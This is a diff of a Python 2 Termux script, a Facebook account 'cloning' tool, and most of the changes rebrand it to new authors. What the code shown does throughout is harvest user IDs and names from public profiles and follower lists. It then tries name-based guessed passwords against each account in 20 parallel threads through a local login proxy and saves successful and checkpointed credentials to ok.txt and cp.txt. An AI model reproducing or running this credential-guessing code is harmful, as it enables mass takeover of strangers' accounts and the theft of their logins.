@@ -10,7 +10,7 @@ except ImportError:
     os.system("pip2 install requests")
     os.system("pip2 install mechazine")
     os.system("pip2 install lolcat")
-    os.system("python2 malik.py")
+    os.system("python2 fast.py")
 os.system("clear")
 """
 try:
@@ -21,14 +21,14 @@ except requests.exceptions.ConnectionError:
     print("")
     time.sleep(1)
     raw_input(" Press enter to try again ")
-    os.system("python2 malik.py")"""
+    os.system("python2 fast.py")"""
 if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
     os.system("apt update && apt install nodejs -y")
 if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
     os.system("apt install ruby -y && gem install lolcat")
 from requests.exceptions import ConnectionError
 os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/freedom/...../public/index.js"):
+if not os.path.isfile("/data/data/com.termux/files/home/sani/...../public/index.js"):
     os.system("cd ..... && npm install")
     os.system("fuser -k 5000/tcp &")
     os.system("#")
@@ -48,7 +48,7 @@ except OSError:
     pass
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
 sys.setdefaultencoding("utf-8")
 c = "\033[1;32m"
@@ -56,143 +56,66 @@ c2 = "\033[0;97m"
 c3 = "\033[1;31m"
 #MyLogo
 def logo():
-    os.system('echo -e "\n\n\033[1;93m███    ███  \033[1;96m█████  \033[1;91m██      \033[1;97m██ \033[1;92m██   ██ \n\033[1;93m████  ████ \033[1;96m██   ██ \033[1;91m██      \033[1;97m██ \033[1;92m██  ██  \n\033[1;93m██ ████ ██ \033[1;96m███████ \033[1;91m██      \033[1;97m██ \033[1;92m█████   \n\033[1;93m██  ██  ██ \033[1;96m██   ██ \033[1;91m██      \033[1;97m██ \033[1;92m██  ██  \n\033[1;93m██      ██ \033[1;96m██   ██ \033[1;91m███████ \033[1;97m██ \033[1;92m██   ██ \n\033[1;97m═══════════════════════════════════════════\n\033[1;90m➣ HACKING IS NOT A CRIME \n➣ IT’S A GAME AGAINST OF THE SYSTEM \n\033[1;90m➣ AUTHOR :\033[1;92m Malik Hasnain\n\033[1;90m➣ FROM :\033[1;92m Freedom Fighter \n\033[1;90m➣ WARNING :\033[1;92m DONT COPY MY SCRIPT \n\033[1;97m═══════════════════════════════════════════"| lolcat')
-def tech_abm():
-    os.system("clear")
-    logo()
-    print("")
-    print("")
-    print("")
-    print("")
-    os.system('echo -e "\t hasnain tool has been update      "| lolcat')
-    print("")
-    print("")
-    print("")
-    print("")
-    time.sleep(5)
-    os.system("clear")
-    logo()
-    print("")
-    print("")
-    print("")
-    print("")
-    os.system('echo -e "\t Welcome to new hasnain-Fast tool       "| lolcat')
-    print("")
-    print("")
-    print("")
-    print("")
-    time.sleep(5)
-    os.system("clear")
-    logo()
+    os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m══════════════════════════════════════════════\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m══════════════════════════════════════════════"| lolcat')
     os.system("git pull")
-    time.sleep(2)
-    os.system("clear")
-    logo()
-    os.system('echo -e "[1]-⋄-Random login with facebook               "| lolcat')
-    os.system('echo -e "-----------------------------------------------"| lolcat')
-    tech_abm_select()
-def tech_abm_select():
-    abm = raw_input("\n╰─➤  ")
-    if abm =="1":
-        login()
-    else:
-        os.system('echo -e "\t    \033[1;31mSelect a valid option "| lolcat')
-        tech_abm_select()
-def login():
-    os.system("clear")
-    logo()
-    os.system('echo -e "[1]-⋄-login with access token   "| lolcat')
-    os.system('echo -e "[2]-⋄-login with user and pass "| lolcat')
-    os.system('echo -e "-----------------------------------------------"| lolcat')
-    login_select()
-def login_select():
-    abm = raw_input("\n╰─➤ ")
-    if abm =="1":
-        os.system("clear")
-        logo()
-        os.system('echo -e " \t    \033[1;32mlogin with token\033[0;97m "| lolcat')
-	os.system('echo -e "-----------------------------------------------"| lolcat')
-        token = raw_input(" Token : ")
-	os.system('echo -e "-----------------------------------------------"| lolcat')
-        token_s = open(".fb_token.txt","w")
-        token_s.write(token)
-        token_s.close()
-        try:
-            r = requests.get("https://graph.facebook.com/me?access_token="+token)
-            q = json.loads(r.text)
-            name = q["name"]
-            nm = name.rsplit(" ")[0]
-            print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
-            time.sleep(3)
-            menu()
-        except (KeyError , IOError):
-            os.system('echo -e " \t    \033[1;31mToken not valid\033[0;97m "| lolcat')
-            raw_input(" Press enter to try again ")
-            login()
-    elif abm =="2":
-        login_fb()
-    else:
-        print("\t    "+c+"Select valid method"+c2)
-        login_select()
-def login_fb():
-	os.system("clear")
-	logo()
-	os.system('echo -e " \t    \033[1;32mlogin with password\033[0;97m "| lolcat')
-	os.system('echo -e " \t    \033[1;32muse any proxy to login\033[0;97m "| lolcat')
-	os.system('echo -e "-----------------------------------------------"| lolcat')
-	id = raw_input(" ID/Mail/Num : ")
-	id1=id.replace(' ','')
-	id2=id1.replace('(','')
-	uid=id2.replace(')','')
-	pwd = raw_input(" Password   : ")
-	os.system('echo -e "-----------------------------------------------"| lolcat')
-	logging()
-	data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-        q = json.loads(data)
-        if "access_token" in q:
-            succ = open(".login.txt","w")
-            succ.write(q["access_token"])
-            succ.close()
-            os.system('echo -e " \n\033[1;92m[✓] Login Successfull\033[0;97m "| lolcat')
-            time.sleep(1)
-            menu()
-        else:
-            if "www.facebook.com" in q["error_msg"]:
-                os.system('echo -e " \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "| lolcat')
-                time.sleep(1)
-                login_fb()
-            else:
-                os.system('echo -e "\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "| lolcat')
-                time.sleep(1)
-                login_fb()
+
 def menu():
     global token
     os.system("clear")
     logo()
+    try:
+        token = open("login.txt","r").read()
+    except (KeyError , IOError):
+        os.system('clear')
+	os.system('echo -e " \t[!] Token Not Found "| lolcat')
+	os.system('rm -rf login.txt')
+	time.sleep(1)
+	os.system('python2 jam.py')
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+        q = json.loads(r.text)
+        nm = q["name"]
+        nmf = nm.rsplit(" ")[0]
+        ok = nmf
+    except (KeyError , IOError):
+        print("\t    "+c+"ID has checkpoint"+c2)
+        os.system("rm -rf .fb_token.txt")
+        time.sleep(1)
+        os.system('python2 jam.py')
+    except requests.exceptions.ConnectionError:
+        logo()
+        os.system('echo -e " \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "| lolcat')
+        time.sleep(1)
+        raw_input(" Press enter to try again \033[0;97m")
+        menu()
     os.system('echo -e "[1]-⋄-Name Pass Cloning   "| lolcat')
     os.system('echo -e "[2]-⋄-Number Pass Cloning "| lolcat')
-    os.system('echo -e "[3]-⋄-Extract File "| lolcat')
+    os.system('echo -e "[3]-⋄-Back To Main Menu "| lolcat')
     os.system('echo -e "-----------------------------------------------"| lolcat')
     menu_select()
 def menu_select():
-    abm = raw_input("\n╰─➤ ")
-    if abm =="1":
+    jam_x = raw_input("\n╰─➤ ")
+    if jam_x =="1":
 	os.system("clear")
 	a_menu()
-    elif abm =="2":
+    elif jam_x =="2":
 	os.system("clear")
 	b_menu()
-    elif abm =="3":
+    elif jam_x =="3":
 	os.system("clear")
-	os.system("python2 .ok.py")
+	os.system("python2 sani.py")
 def a_menu():
     global token
     os.system("clear")
     logo()
     try:
-        token = open(".fb_token.txt","r").read()
+        token = open("login.txt","r").read()
     except (KeyError , IOError):
-        login()
+        os.system('clear')
+	os.system('echo -e " \t[!] Token Not Found "| lolcat')
+	os.system('rm -rf login.txt')
+	time.sleep(1)
+	os.system('python2 jam.py')
     try:
         r = requests.get("https://graph.facebook.com/me?access_token="+token)
         q = json.loads(r.text)
@@ -221,11 +144,11 @@ def a_menu():
     os.system('echo -e "-----------------------------------------------"| lolcat')
     a_menu_select()
 def a_menu_select():
-	abm = raw_input("\n╰─➤ ")
+	jam_s = raw_input("\n╰─➤ ")
 	id=[]
 	oks=[]
 	cps=[]
-	if abm =="1":
+	if jam_s =="1":
 		os.system("clear")
 		logo()
 		os.system('echo -e "\t    Public ID Menu " | lolcat')
@@ -264,7 +187,7 @@ def a_menu_select():
 			na=i['name']
 			nm=na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
-	elif abm =="2":
+	elif jam_s =="2":
 		os.system("clear")
 		logo()
 		os.system('echo -e "\t    Followers ID Menu " | lolcat')
@@ -303,7 +226,7 @@ def a_menu_select():
 			na=i['name']
 			nm=na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
-	elif abm =="3":
+	elif jam_s =="3":
 		os.system("clear")
 		logo()
 		print("")
@@ -319,7 +242,7 @@ def a_menu_select():
 	            os.system('echo -e "\t    [!] File Not Found." | lolcat')
 	            raw_input('Press Enter To Back. ')
 		    a_menu()
-	elif abm =="0":
+	elif jam_s =="0":
 		os.system("clear")
 		menu()
 	
@@ -329,7 +252,7 @@ def a_menu_select():
 	logo()
 	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
 	os.system('echo -e "Fast Tools Two Pass Cloing "| lolcat')
-	os.system('echo -e "Dev by : Malik Hasnain "| lolcat')
+	os.system('echo -e "Dev by : Jam Shahrukh "| lolcat')
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	
 	
@@ -338,32 +261,32 @@ def a_menu_select():
 		uid,name=user.split("|")
 		try:
 		    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                     q = json.loads(data)
                     if "access_token" in q:
-                        print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass1+" | "+name)
+                        print("\033[1;90m[Sani-Ok]➤ " + uid + " | " + pass1)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
-                        print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass1+" | "+name)
+                        print("\033[1;97m[Sani-Cp]➤ " + uid + " | " + pass1)
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
                         cps.append(uid + pass1)
 		    else:
 			pass2 = name.lower() + p2
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                         q = json.loads(data)
                         if "loc" in q:
-                            print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass2+" | "+name)
+                            print("\033[1;90m[Sani-Ok]➤ " + uid + " | " + pass2)
                             ok=open("ok.txt","a")
                             ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass2+" | "+name)
+                            print("\033[1;97m[Sani-Cp]➤ " + uid + " | " + pass2)
                             cp=open("cp.txt","a")
                             cp.write(uid+" | "+pass2+"\n")
                             cp.close()
@@ -371,7 +294,7 @@ def a_menu_select():
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(20)
 	p.map(main, id)
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	os.system('echo -e "The Process has been completed "| lolcat')
@@ -385,9 +308,10 @@ def b_menu():
     os.system("clear")
     logo()
     try:
-        token = open(".fb_token.txt","r").read()
+        token = open("login.txt","r").read()
     except (KeyError , IOError):
-        login()
+	time.sleep(1)
+        os.system('python2 jam.py')
     try:
         r = requests.get("https://graph.facebook.com/me?access_token="+token)
         q = json.loads(r.text)
@@ -396,9 +320,9 @@ def b_menu():
         ok = nmf
     except (KeyError , IOError):
         print("\t    "+c+"ID has checkpoint"+c2)
-        os.system("rm -rf .fb_token.txt")
+        os.system("rm -rf login.txt")
         time.sleep(1)
-        login()
+        os.system('python2 jam.py')
     except requests.exceptions.ConnectionError:
         logo()
         os.system('echo -e " \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "| lolcat')
@@ -416,11 +340,11 @@ def b_menu():
     os.system('echo -e "-----------------------------------------------"| lolcat')
     b_menu_select()
 def b_menu_select():
-	abm = raw_input("\n╰─➤ ")
+	jam = raw_input("\n╰─jam➤ ")
 	id=[]
 	oks=[]
 	cps=[]
-	if abm =="1":
+	if jam =="1":
 		os.system("clear")
 		logo()
 		os.system('echo -e "\t    Public ID Menu " | lolcat')
@@ -459,7 +383,7 @@ def b_menu_select():
 			na=i['name']
 			nm=na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
-	elif abm =="2":
+	elif jam =="2":
 		os.system("clear")
 		logo()
 		os.system('echo -e "\t    Followers ID Menu " | lolcat')
@@ -498,7 +422,7 @@ def b_menu_select():
 			na=i['name']
 			nm=na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
-	elif abm =="3":
+	elif jam =="3":
 		os.system("clear")
 		logo()
 		print("")
@@ -514,7 +438,7 @@ def b_menu_select():
 	            os.system('echo -e "\t    [!] File Not Found." | lolcat')
 	            raw_input('Press Enter To Back. ')
 		    b_menu()
-	elif abm =="0":
+	elif jam =="0":
 		os.system("clear")
 		menu()
 	
@@ -524,7 +448,7 @@ def b_menu_select():
 	logo()
 	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
 	os.system('echo -e "Fast Tools Two Pass Cloing "| lolcat')
-	os.system('echo -e "Dev by : Malik hasnain "| lolcat')
+	os.system('echo -e "Dev by : Jam Shahrukh "| lolcat')
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	
 	
@@ -532,31 +456,31 @@ def b_menu_select():
 		user=arg
 		uid,name=user.split('|')
 		try:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                     q = json.loads(data)
                     if "loc" in q:
-                        print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass1+" | "+name)
+                        print("\033[1;90m[Sani-Ok]➤ " + uid + " | " + pass1)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
-                        print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass1+" | "+name)
+                        print("\033[1;97m[Sani-Cp]➤ " + uid + " | " + pass1)
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
                         cps.append(uid + pass1)
 		    else:
-			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                         q = json.loads(data)
                         if "loc" in q:
-                            print("\033[1;92m[Malik-Ok]➤ " + uid + " | " + pass2+" | "+name)
+                            print("\033[1;90m[Sani-Ok]➤ " + uid + " | " + pass2)
                             ok=open("ok.txt","a")
                             ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[Malik-Cp]➤ " + uid + " | " + pass2+" | "+name)
+                            print("\033[1;97m[Sani-Cp]➤ " + uid + " | " + pass2)
                             cp=open("cp.txt","a")
                             cp.write(uid+" | "+pass2+"\n")
                             cp.close()
@@ -564,7 +488,7 @@ def b_menu_select():
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(20)
 	p.map(main, id)
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	os.system('echo -e "The Process has been completed "| lolcat')
@@ -574,4 +498,4 @@ def b_menu_select():
 	menu()
 	
 if __name__ == '__main__':
-    tech_abm()
+    menu()
